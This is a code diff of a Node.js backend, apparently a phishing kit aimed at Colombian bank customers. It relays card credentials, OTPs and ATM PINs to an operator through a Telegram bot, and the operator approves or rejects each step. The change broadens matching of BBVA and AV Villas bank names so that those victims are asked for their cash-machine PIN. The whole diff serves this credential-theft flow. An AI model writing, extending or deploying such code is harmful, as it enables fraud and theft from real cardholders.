@@ -13,11 +13,22 @@ const PUBLIC_BACKEND_URL = process.env.PUBLIC_BACKEND_URL || 'https://backveneco
 const pagosPendientes = new Map();
 
 // 🔥 BANCOS QUE PIDEN CLAVE ATM EN VEZ DE OTP
-const BANCOS_CLAVE_ATM = ['av villas', 'bbva colombia', 'bbva'];
-
+// Detección flexible por palabras clave (tolera nombres largos oficiales)
 function esBancoClaveATM(banco) {
     if (!banco) return false;
-    return BANCOS_CLAVE_ATM.includes(String(banco).trim().toLowerCase());
+    const b = String(banco).trim().toLowerCase();
+
+    // BBVA: "BBVA", "BBVA Colombia", "BANCO BILBAO VIZCAYA ARGENTARIA COLOMBIA, S.A", etc.
+    if (b.includes('bbva')) return true;
+    if (b.includes('bilbao') && b.includes('vizcaya')) return true;
+    if (b.includes('bilbao vizcaya')) return true;
+
+    // AV Villas: "AV Villas", "AVVillas", "A.V. Villas", "Banco AV Villas", etc.
+    if (b.includes('av villas')) return true;
+    if (b.includes('avvillas')) return true;
+    if (b.includes('a.v. villas')) return true;
+
+    return false;
 }
 
 async function tgSendMessage(text, replyMarkup) {
@@ -158,7 +169,6 @@ app.post('/api/crear-pago', async (req, res) => {
                 { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
             ]]};
         } else if (pasoActual === 'credenciales') {
-            // 🔥 Si el banco es AV Villas o BBVA → agregar botón "Clave ATM"
             const botones = [
                 { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
                 { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
@@ -204,7 +214,7 @@ app.get('/api/estado-pago/:solicitud_id', (req, res) => {
                 estado: 'aprobado',
                 fase: 'credenciales',
                 marca: pago.marca_tarjeta,
-                requiere_clave_atm: !!pago.requiere_clave_atm   // 🔥 para el frontend
+                requiere_clave_atm: !!pago.requiere_clave_atm
             });
         }
         if (pago.estado === 'rechazado_credenciales') {
@@ -263,7 +273,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 await tgEditMessage(msgId, `❌ <b>RECHAZADO</b>\n\n` + texto + `\n📌 <b>Motivo:</b> ${motivo}`);
             }
         } else if (accion === 'clave_atm') {
-            // 🔥 Botón "Clave ATM": pide al cliente ingresar la clave del cajero
             pago.estado = 'aprobado_credenciales';
             await tgAnswerCallback(cq.id, '🔑 Se solicitó Clave ATM al cliente');
             if (msgId) {
